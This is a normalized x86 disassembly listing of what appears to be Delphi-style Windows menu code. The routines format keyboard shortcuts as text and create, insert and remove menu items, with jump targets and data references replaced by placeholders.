rol [ eax + eax + 0x50 ] 0x1
rol [ eax + eax ] 0x1
sub_44d044
cwde
add [ eax ] al
[ eax + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
inc ecx
add al dh
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
add al cl
xor al 0x40
add [ esp + edx * 4 + 0x41 ] al
ja r-xdata
add [ edx ] dh
rol [ eax + eax + 0x46 ] 0x1
rol [ eax + eax + 0x58 ] 0x1
add [ eax ] al
add [ edx - 0x650fffbf ] dl
inc ecx
add al al
je r-xdata
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
sbb al 0x15
inc ebp
add [ eax + 0x40 ] ch
inc ecx
add al bh
xchg esi eax
inc ecx
add [ edi + edi + 0x1d440041 ] al
inc ebp
add al ah
sbb eax 0x97e00045
inc ecx
add al bl
cwde
inc ecx
add [ eax ] cl
fwait
inc ecx
add al dh
xchg edi eax
inc ecx
add al ch
xchg edi eax
inc ecx
add [ eax ] dl
fwait
inc ecx
add [ eax + 0x2c004514 ] al
sbb eax 0x15700045
inc ebp
add [ ebp + ebx + 0x45 ] bl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
insd
mov esp 0xa00044ca
add [ eax ] al
jmp [ eax + 0x1ff0000 ]
sub_44d818
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43c73c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_441fe4
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_44d870
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_44d8a8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403fbc
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_40422c
sub_44d8fc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44dae5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404054
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_4041a4
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404054
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404054
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_4041a4
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_4041a4
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403fbc
mov eax esi
call sub_403fbc
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_404054
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407e9c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4042c8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_44d8a8
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404284
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_404054
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404284
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404284
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404284
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44daec
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403fe0
retn
sub_44db00
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_40427c
push eax
mov eax edi
call sub_40427c
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40427c
push eax
mov eax edi
call sub_40447c
push eax
mov eax [ esi ]
call sub_40447c
pop edx
pop ecx
call sub_407d7c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_40427c
mov ecx eax
mov eax esi
mov edx 0x1
call sub_40451c
sub_44db5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_44dc37
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44db00
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44db00
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44db00
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_44db00
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dc3e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44d8fc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407d2c
test eax eax
jne r-xdata
sub_44dc74
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_450214
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_450224
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44dcd4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_450214
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_450214
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_450224
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450224
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44dc74
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_44dc74
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_450224
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_450224
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_44de20
push ebx
mov ebx eax
mov eax ebx
call sub_44a510
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_452d30
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_44de58
push ebx
mov ebx eax
mov eax ebx
call sub_44a524
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44de88
push ebx
mov ebx eax
mov eax ebx
call sub_44a538
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44deb8
push ebx
mov ebx eax
mov eax ebx
call sub_44a560
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44dee8
push ebx
mov ebx eax
mov eax ebx
call sub_44a588
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_4043c8
je r-xdata
mov al 0x1
pop ebx
retn
sub_44df1c
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44a54c
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44df58
push ebx
mov ebx eax
mov eax ebx
call sub_44a59c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44df8c
push ebx
mov ebx eax
mov eax ebx
call sub_44a5b0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44dfc0
push ebx
mov ebx eax
mov eax ebx
call sub_44a5c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44dff4
push ebx
mov ebx eax
mov eax ebx
call sub_419c70
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44e01c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_44e03c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45007c
sub_44e05c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4500ec
sub_44e07c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_450140
sub_44e09c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_44e0b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_404010
sub_44e0dc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_45026c
sub_44e0fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_450248
sub_44e11c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_45025c
sub_44e13c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44e168
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419380
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44dc54
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_450b78
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_44e1e4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_452b14
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_450214
test eax eax
jg r-xdata
mov edx esi
call sub_4505ac
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_450224
call sub_40326c
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_40326c
lea eax [ esi + 0x44 ]
call sub_40cd80
lea eax [ esi + 0x78 ]
call sub_40cd80
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_44e600
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413e9c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
test bl bl
jle r-xdata
call sub_40326c
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_44e298
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e4f3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e4fa
lea eax [ ebp - 0x40 ]
call sub_403fbc
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_404054
mov eax ebx
call sub_450214
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_44e7a8
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043c8
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_450214
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_4507d0
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_44d8fc
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40433c
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40447c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40447c
push eax
mov eax ebx
call sub_44e7a8
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_44fdec
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4043c8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40447c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_450214
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_44e7a8
mov [ ebp - 0x25 ] eax
sub_44e513
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_44e298
xor eax eax
pop ebp
retn
sub_44e538
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_451e0c
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_450dd4
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4512d0
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_44dcd4
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_44e5a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44e5f2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4184b0
mov eax [ ebp - 0x4 ]
call sub_44db5c
mov edx eax
mov eax ebx
call sub_450248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e5f9
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_44e600
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_44e678
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419450
sub_44e63c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4197d0
mov eax ebx
call sub_4501fc
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_4501fc
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_403468
pop esi
pop ebx
retn
mov eax ebx
call sub_44e678
sub_44e678
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_44e7a8
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_44e678
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_44e7a8
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_44e7a8
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44e538
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax ebp
call sub_44e7a8
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_44e748
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_450214
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_450224
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_450224
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_450224
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44d850
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_44e7a8
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44e538
mov eax [ rw-data ]
call sub_44d850
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_44e7f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4196f8
push ebx
push sub_44e5a8
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_44e838
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_44ea1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4507d0
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404054
test bh 0x4
je r-xdata
mov eax edi
call sub_451e0c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043c8
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41cf7c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404284
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
